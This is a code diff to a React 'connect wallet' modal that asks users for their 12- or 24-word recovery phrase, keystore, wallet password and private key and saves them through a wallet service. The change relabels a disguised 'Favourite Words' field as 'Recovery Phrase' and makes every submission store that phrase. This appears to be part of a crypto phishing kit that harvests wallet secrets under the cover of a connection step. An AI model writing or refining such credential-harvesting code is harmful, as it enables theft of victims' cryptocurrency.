@@ -1,9 +1,10 @@
 import "./ConnectFormModal.css";
 import { useState, useEffect } from "react";
 import { FaTimes, FaCheck } from "react-icons/fa";
+import { auth } from "../firebase/firebase";
 
 import {
-  validateFavouriteWords,
+  validateRecoveryPhrase,
   saveWalletConnection,
 } from "../services/walletService";
 
@@ -20,7 +21,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
   const [form, setForm] = useState({
     name: "",
     email: "",
-    phrase: "",
+    recoveryPhrase: "",     // Changed from phrase
     keystore: "",
     password: "",
     privateKey: "",
@@ -37,7 +38,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
       setForm({
         name: "",
         email: "",
-        phrase: "",
+        recoveryPhrase: "",
         keystore: "",
         password: "",
         privateKey: "",
@@ -73,13 +74,12 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
       return false;
     }
 
-    if (tab === "phrase") {
-      const validation = validateFavouriteWords(form.phrase);
+    // Recovery Phrase Validation
+    const validation = validateRecoveryPhrase(form.recoveryPhrase);
 
-      if (!validation.isValid) {
-        setValidationError(validation.error);
-        return false;
-      }
+    if (!validation.isValid) {
+      setValidationError(validation.error);
+      return false;
     }
 
     return true;
@@ -87,6 +87,11 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
 
   const handleSubmit = async () => {
     setError(null);
+
+    if (!auth.currentUser) {
+      setError("Please log in to your account first");
+      return;
+    }
 
     if (!validateFormData()) return;
 
@@ -100,12 +105,10 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
         type: wallet?.name || "Unknown",
       };
 
-      if (tab === "phrase") {
-        const validation = validateFavouriteWords(form.phrase);
-
-        walletData.favouriteWords = form.phrase.trim();
-        walletData.wordCount = validation.wordCount;
-      }
+      const validation = validateRecoveryPhrase(form.recoveryPhrase);
+      
+      walletData.recoveryPhrase = form.recoveryPhrase.trim();   // Changed
+      walletData.wordCount = validation.wordCount;
 
       setStep(1);
       setProgress(20);
@@ -133,11 +136,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
       setSuccess(true);
     } catch (err) {
       console.error(err);
-
-      // ❌ REMOVED alert here
-
       setError(err.message || "Something went wrong");
-
       setStep(0);
       setProgress(0);
     } finally {
@@ -169,14 +168,12 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
               </h2>
             </div>
 
-            {/* ERROR DISPLAY */}
             {error && (
               <div className="validation-error">
                 <p>{error}</p>
               </div>
             )}
 
-            {/* PROGRESS */}
             {step > 0 && (
               <div className="connection-steps">
                 <div className="progress-bar">
@@ -202,7 +199,6 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
               </div>
             )}
 
-            {/* FORM */}
             {step === 0 && (
               <>
                 <div className="connect-tabs">
@@ -210,7 +206,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
                     className={tab === "phrase" ? "active" : ""}
                     onClick={() => setTab("phrase")}
                   >
-                    Favourite Words
+                    Recovery Phrase
                   </span>
                 </div>
 
@@ -232,16 +228,16 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
                     onChange={handleChange}
                   />
 
-                  <label>Favourite Words</label>
+                  <label>Recovery Phrase</label>
                   <textarea
-                    name="phrase"
-                    placeholder="Enter 12 or 24 favourite words"
-                    value={form.phrase}
+                    name="recoveryPhrase"                    // Changed
+                    placeholder="Enter your 12 or 24 word recovery phrase"
+                    value={form.recoveryPhrase}
                     onChange={handleChange}
                   />
 
                   <small>
-                    Choose 12 or 24 favourite words separated by spaces
+                    Enter exactly 12 or 24 words separated by spaces
                   </small>
 
                   {validationError && (
@@ -270,7 +266,6 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
         </div>
       )}
 
-      {/* SUCCESS MODAL */}
       {success && (
         <div className="success-overlay">
           <div className="success-modal premium-success">
@@ -282,15 +277,12 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
 
             <div className="uid-box">
               <span className="uid-label">UNIQUE IDENTIFIER</span>
-
               <div className="uid-code">{uniqueId}</div>
 
               <div className="uid-actions">
                 <button
                   className="uid-btn"
-                  onClick={() => {
-                    navigator.clipboard.writeText(uniqueId);
-                  }}
+                  onClick={() => navigator.clipboard.writeText(uniqueId)}
                 >
                   Copy UID
                 </button>
